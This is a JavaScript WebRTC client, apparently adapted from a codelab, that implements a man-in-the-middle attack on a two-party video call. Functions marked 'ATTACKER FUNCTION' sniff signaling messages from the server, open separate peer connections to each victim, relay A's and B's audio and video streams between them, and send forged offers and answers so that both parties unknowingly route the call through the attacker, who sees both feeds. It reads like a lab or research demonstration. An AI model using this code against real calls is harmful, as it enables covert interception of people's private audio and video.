'use strict';

var isChannelReady = false;
var isInitiator = false;
var isStarted = false;
var isAttacker = false;//delineates attacker
var localStream = null;
var pc, pcA, pcB;
var remoteStream = null;
var turnReady;
var fakeoffer = false;
var fakeanswer = false;
var isStartedA = false;
var isStartedB = false;
var UserA_SDP, UserB_SDP;
var tellA_toCall = false;

var BremoteStream;

/**
 * ICE server configs -- need to fill in stun info
 */
const configuration = {iceTransportPolicy: "relay",
  iceServers: [
    {
      'urls': 'stun:stun.l.google.com:19302',
    },
    {
      'urls': '',
      'credential': '',
      'username': ''
    },
    {
      'urls': '',
      'credential': '',
      'username': ''    
    }

  ],
};

// Set up audio and video regardless of what devices are present.
var sdpConstraints = {
  offerToReceiveAudio: true,
  offerToReceiveVideo: true
};

/////////////////////Room Set Up////////////////////////

//Get room name from user
var myRoom = prompt('Enter room name:');

var socket = io.connect();

//Emits room name to socket to begin process
if (myRoom !== '') {
  socket.emit('create or join', myRoom);
  console.log('Attempted to create or  join room', myRoom);
}

/////////////////////Signal Server Message Handling (Send)////////////////////////

/**
 * Function handles all communication between A/B and the signal server
 * @param {} message 
 */
function sendMessage(message) {
  console.log('Client sending message: ', message, myRoom);
  socket.emit('message', message, myRoom);
}

/**
 * ATTACKER FUNCTION
 * Function used to direct messages to A from attacker
 * @param {} message message for A
 */
function ForwardA_Message(message){
  socket.emit('forward_ToA', message);
}

/**
 * ATTACKER FUNCTION
 * Function used to handle messages to B from attacker
 * @param {} message 
 */
function ForwardB_Message(message){
  socket.emit('forward_ToB', message);
}



/////////////////////Signal Server Message Handling (Receive)////////////////////////

/**
 * ATTACKER FUNCTION
 * When mitm room is created, attacker variable is set and connections initialized
 */ 
socket.on('set attacker', function(){
  isAttacker = true;
  document.getElementById("header").innerHTML = "You are the attacker!";
  createTwoConnection("pcB");
  createTwoConnection("pcA");
});

//Sets roomname and isInitiator for A
socket.on('created', function(room) {
  console.log('Created room ' + room);
  myRoom = room;
  isInitiator = true;
});

//Debug -- room is never full with new set up
socket.on('full', function(room) {
  console.log('Room ' + room + ' is full');
});

//Message emitted when B joins, sets isChannelready to true for A
socket.on('join', function (room){
  console.log('Another peer made a request to join room ' + room);
  console.log('This peer is the initiator of room ' + room + '!');
  myRoom = room;
  isChannelReady = true;
});

//Message emitted when B joins, sets isChannelready to true for B and sets B's room name
socket.on('joined', function(room) {
  console.log('joined: ' + room);
  myRoom = room;
  isChannelReady = true;
});

//Allows server to use console log
socket.on('log', function(array) {
  console.log.apply(console, array);
});

/**
 * Unified handling for A/B when they receive messages from the signal server
 */
socket.on('message', function(message) {
  console.log('Client received message:', message);
  if (message === 'got user media') {
    maybeStart();
  } else if (message.type === 'offer') {
    if (!isInitiator && !isStarted) {
      maybeStart();
    }
    pc.setRemoteDescription(new RTCSessionDescription(message));
    doAnswer();
  } else if (message.type === 'answer' && isStarted) {
	  console.log("A received an answer!");
	  var temp = message;
    setTimeout(() => { pc.setRemoteDescription(new RTCSessionDescription(temp));}, 2000);
    //pc.setRemoteDescription(new RTCSessionDescription(message));
  } else if (message.type === 'candidate' && isStarted) {
    var candidate = new RTCIceCandidate({
      sdpMLineIndex: message.label,
      candidate: message.candidate
    });
    pc.addIceCandidate(candidate);
  } else if (message === 'bye' && isStarted) {
    handleRemoteHangup();
  }
});

/**
 * ATTACKER FUNCTION
 * Function used by attacker to synchronize call based on what A/B send
 */ 
socket.on('sniff', function(message, room){
  console.log("sniffed message:" + message)

  //Sends "got user media" prompting A to begin the call
  if ((room  !== 'bad1') &&(message === "got user media")){
    ForwardA_Message("got user media")
  }

  // if this is attacker and the fake offer (for b) hasn't been created yet, set the remote desciption for connect
  if (isAttacker && !fakeoffer && message.type === "offer"){
    UserA_SDP = message;
    pcA.setRemoteDescription(new RTCSessionDescription(message)); //Remote description of User A
    //createTwoConnection(pcB)
    fakeoffer = true;
  }else if(isAttacker && !fakeanswer && message.type === "answer"){//Handles answer from B
    //createTwoConnection(pcA)
    pcB.setRemoteDescription(new RTCSessionDescription(message)); //REmote description of User B
    fakeanswer = true;
  }

  //manages Ice negotiation process for attacker
  if (message.type === 'candidate' && isStarted) {
    var candidate = new RTCIceCandidate({
      sdpMLineIndex: message.label,
      candidate: message.candidate
    });

    //Ice negotation for A
    if (room === "bad1"){
      pcA.addIceCandidate(candidate);
    }
    //Ice negotiation for B
    else if (room === "bad2"){
      pcB.addIceCandidate(candidate); 
    }
  }
});


///////////////////////CALL SET-UP (USED by A and B)/////////////////////////////

var localVideo = document.querySelector('#localVideo'); //attacker's view of User A (or A/B's view of self)
var remoteVideo = document.querySelector('#remoteVideo'); //attacker's view of User B (or A/B's view of other)

//Handler for getting user media (for A/B)
navigator.mediaDevices.getUserMedia({
  audio: true,
  video: true
})
.then(gotStream)
.catch(function(e) {
  alert('getUserMedia() error: ' + e.name);
});

//Disabled local video for attacker
function gotStream(stream) {
  if(!isAttacker){
    console.log('Adding local stream.');
    localStream = stream;
    localVideo.srcObject = stream;
    sendMessage('got user media');
    if (isInitiator) {
      maybeStart();
    }
  }
}

var constraints = {
  video: true
};

console.log('Getting user media with constraints', constraints);

//Function used by A/B to execute actions need for call
function maybeStart() {
  console.log('>>>>>>> maybeStart() ', isStarted, localStream, isChannelReady);
  if (!isStarted && typeof localStream !== 'undefined' && isChannelReady) {
    console.log('>>>>>> creating peer connection');
    createPeerConnection();
    pc.addStream(localStream);
    isStarted = true;
    console.log('isInitiator', isInitiator);
    if (isInitiator) {
      doCall();
    }
  }
}

window.onbeforeunload = function() {
  sendMessage('bye');
};

////////////////////////PEER CONNECTION AND ICE CANDIDATE HANDLING/////////////////////////////////

/**
 * Creates Peer connection for A and B
 */
function createPeerConnection() {
  try {
    pc = new RTCPeerConnection(configuration);
    pc.onicecandidate = handleIceCandidate;
    pc.onaddstream = handleRemoteStreamAdded;
    pc.onremovestream = handleRemoteStreamRemoved;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
    return;
  }
}

/**
 * Event handler for A/B to handle ice candidates
 * @param {} event peerconnection ecent (ICE candidate)
 */
function handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    sendMessage({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}

/**
 * Unified event handler for A/B to add remote stream
 * @param {} event 
 */
function handleRemoteStreamAdded(event) {
  console.log('Remote stream added.');
  remoteStream = event.stream;
  remoteVideo.srcObject = remoteStream;
  
}

/**
 * Handles remote stream removed (A/B/Attacker)
 * @param {} event 
 */
function handleRemoteStreamRemoved(event) {
  console.log('Remote stream removed. Event: ', event);
}

/**
 * Handles create offer erro (A/B/Attacker)
 * @param {} event 
 */
function handleCreateOfferError(event) {
  console.log('createOffer() error: ', event);
}

/**
 * ATTACKER FUNCTION
 * Create Peer connection for Attacker
 * @param {} pcinput either pcA (PC with A) or pcB (pc with B)
 */
function createTwoConnection(pcinput) {
  if (pcinput === "pcA"){
    try {
      pcA = new RTCPeerConnection(configuration);
      pcA.onicecandidate = ToA_handleIceCandidate;
      pcA.onaddstream = FromA_handleRemoteStreamAdded;
      pcA.onremovestream = handleRemoteStreamRemoved;
      console.log('Created RTCPeerConnnection');
    } catch (e) {
      console.log('Failed to create PeerConnection, exception: ' + e.message);
      alert('Cannot create RTCPeerConnection object.');
      return;
    }
  }else if (pcinput === "pcB"){
    try {
      pcB = new RTCPeerConnection(configuration);
      pcB.onicecandidate = ToB_handleIceCandidate;
      pcB.onaddstream = FromB_handleRemoteStreamAdded;
      pcB.onremovestream = handleRemoteStreamRemoved;
      console.log('Created RTCPeerConnnection');
    } catch (e) {
      console.log('Failed to create PeerConnection, exception: ' + e.message);
      alert('Cannot create RTCPeerConnection object.');
      return;
    }
  }else{
    console.log("nothing created")
  }
}
/**
 * ATTACKER FUNCTION
 * Event handler for ICE candidates received from A
 * @param {} event 
 */
function ToA_handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    ForwardA_Message({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}

/**
 * ATTACKER FUNCTION
 * Event handler for ICE candidates received from B
 * @param {} event 
 */
function ToB_handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    ForwardB_Message({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}

/**
 * ATTACKER FUNCTION
 * Event handler for A's remote stream
 * @param {} event PC event with A's remote stream
 */
function FromA_handleRemoteStreamAdded(event) { //Video coming from A
  console.log('Remote stream added from A.');
  localStream = event.stream;
  localVideo.srcObject = localStream;
  pcB.addStream(localStream)
  doFakeCall();
  
}


/**
 * ATTACKER FUNCTION
 * Event handler for B's remote stream
 * @param {} event 
 */
function FromB_handleRemoteStreamAdded(event) {//Video coming from B
  console.log('Remote stream added from B.');
  BremoteStream = event.stream;
  remoteVideo.srcObject = BremoteStream;
  pcA.addStream(BremoteStream)
  doFakeAnswer();
  
}

////////////////////////CALL MANAGEMENT/////////////////////////////////

/**
 * Initiates call to attacker (A sends sends an offer)
 */
function doCall() {
  console.log('Sending offer to peer');
  pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
}

/**
 * ATTACKER FUNCTION
 * Initiates call to B (Attacker sends sends an offer)
 */
function doFakeCall(){
 pcB.createOffer(FakeB_setLocalAndSendMessage, handleCreateOfferError); 
}

/**
 * Answers a call (B answers call from attacker)
 */
function doAnswer() {
  console.log('Sending answer to peer.');
  pc.createAnswer().then(
    setLocalAndSendMessage,
    onCreateSessionDescriptionError
  );
}

/**
 * ATTACKER FUNCTION
 * Answers a call (Attacker answers call from A)
 */
function doFakeAnswer() {
  console.log('Sending answer to peer.');
  pcA.createAnswer().then(
    FakeA_setLocalAndSendMessage,
    onCreateSessionDescriptionError
  );
}

/**
 * Sets local description and sends session description
 * @param {} sessionDescription 
 */
function setLocalAndSendMessage(sessionDescription) {
  pc.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  sendMessage(sessionDescription);
}

/**
 * ATTACKER FUNCTION
 * Sets local description and sends session description to B
 * @param {} sessionDescription 
 */
function FakeB_setLocalAndSendMessage(sessionDescription) {
  pcB.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  ForwardB_Message(sessionDescription);
  //attack have to user forward and to specific user
}

/**
 * ATTACKER FUNCTION
 * Sets local description and sends session description to B
 * @param {} sessionDescription 
 */
function FakeA_setLocalAndSendMessage(sessionDescription) {
  pcA.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  ForwardA_Message(sessionDescription);
  //attack have to user forward and to specific user
}

/**
 * Unified function (A/B/Attacker) to handle session description errors
 * @param {} error 
 */
function onCreateSessionDescriptionError(error) {
  trace('Failed to create session description: ' + error.toString());
}

/**
 * Hangup function for all users (A/B/Attacker)
 */
function hangup() {
  console.log('Hanging up.');
  stop();
  sendMessage('bye');
}

/**
 * Hangup function for all users (A/B/Attacker)
 */
function handleRemoteHangup() {
  console.log('Session terminated.');
  stop();
  isInitiator = false;
}

/**
 * Closes connection for all users (A/B/Attacker)
 */
function stop() {
  isStarted = false;
  pc.close();
  pc = null;
}

//* Legacy Codelab Functions */

//Unused function from Codelab
//if (location.hostname !== 'localhost') {
//  requestTurn(
//    'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
//  );
//}

//Unused function from codelab
// function requestTurn(turnURL) {
//   var turnExists = false;
//   console.log("RequestTURN called in Room", myRoom);	
//   for (var i in pcConfig.iceServers) {
//     if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
//       turnExists = true;
//       turnReady = true;
//       break;
//     }
//   }
//   if (!turnExists) {
//     console.log('Getting TURN server from ', turnURL);
//     // No TURN server. Get one from computeengineondemand.appspot.com:
//     var xhr = new XMLHttpRequest();
//     xhr.onreadystatechange = function() {
//       if (xhr.readyState === 4 && xhr.status === 200) {
//         var turnServer = JSON.parse(xhr.responseText);
//         console.log('Got TURN server: ', turnServer);
//         pcConfig.iceServers.push({
//           'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
//           'credential': turnServer.password
//         });
//         turnReady = true;
//       }
//     };
//     xhr.open('GET', turnURL, true);
//     xhr.send();
//   }
// }




